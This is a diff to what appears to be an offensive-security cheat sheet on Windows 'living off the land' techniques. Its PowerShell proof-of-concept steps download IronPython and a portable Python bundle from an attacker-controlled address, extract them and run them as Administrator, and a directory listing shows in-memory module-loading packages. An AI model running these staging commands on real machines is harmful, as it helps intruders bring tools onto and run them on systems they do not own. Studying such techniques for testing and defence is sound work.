@@ -442,7 +442,6 @@ II. Basic examples of 'Living off the land' techniques using LOLBAS (i.e. Living
 
 		mimikatz #
 
-
 ---------------------------------------------------------------------------------------------------------------------------------------------------
 3. LOLBAS - Remote.exe (Debugging tool included with Windows Debugging Tools - Allow to execute remote exe files)
 ---------------------------------------------------------------------------------------------------------------------------------------------------
@@ -910,8 +909,8 @@ Note: On Windows machines, to use Python you can install it or download a portab
 
 Basic PoC/example
 -----------------
-PS C:\Users\Administrator> wget -URI http://192.168.1.144:8080/IronPythonPortable.zip -OutFile IronPythonPortable.zip
-PS C:\Users\Administrator> tar -xf .\IronPythonPortable.zip
+PS C:\Users\Administrator> wget -URI http://192.168.1.144:8080/IronPythonPortable.zip -OutFile IronPython.zip
+PS C:\Users\Administrator> tar -xf .\IronPython.zip
 
 PS C:\Users\Administrator\IronPython\net462> ipy.exe
 IronPython 3.4.2 (3.4.2.1000)
@@ -937,6 +936,16 @@ Basic PoC/example
 -----------------
 PS C:\temp> wget -uri https://X.X.X.X/python.zip -OutFile C:\temp\python.zip
 PS C:\temp> tar -xf .\python.zip
+PS C:\temp> ls
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          8/5/2025   6:55 PM                Cryptodome
+d-----         8/24/2025   1:11 AM                pythonmemorymodule
+d-----         7/28/2025  11:55 PM                windows
+<SNIP>
+------         3/23/2022  10:22 PM          99280 python.exe
+<SNIP>
 
 PS C:\temp> .\python.exe
 Python 3.10.4 (tags/v3.10.4:9d38120, Mar 23 2022, 23:13:41) [MSC v.1929 64 bit (AMD64)] on win32
@@ -965,6 +974,16 @@ Basic PoC/example
 -----------------
 PS C:\temp> wget -uri https://X.X.X.X/python.zip -OutFile C:\temp\python.zip
 PS C:\temp> tar -xf .\python.zip
+PS C:\temp> ls
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          8/5/2025   6:55 PM                Cryptodome
+d-----         8/24/2025   1:11 AM                pythonmemorymodule
+d-----         7/28/2025  11:55 PM                windows
+<SNIP>
+------         3/23/2022  10:22 PM          99280 python.exe
+<SNIP>
 
 PS C:\temp> .\python.exe
 Python 3.10.4 (tags/v3.10.4:9d38120, Mar 23 2022, 23:13:41) [MSC v.1929 64 bit (AMD64)] on win32
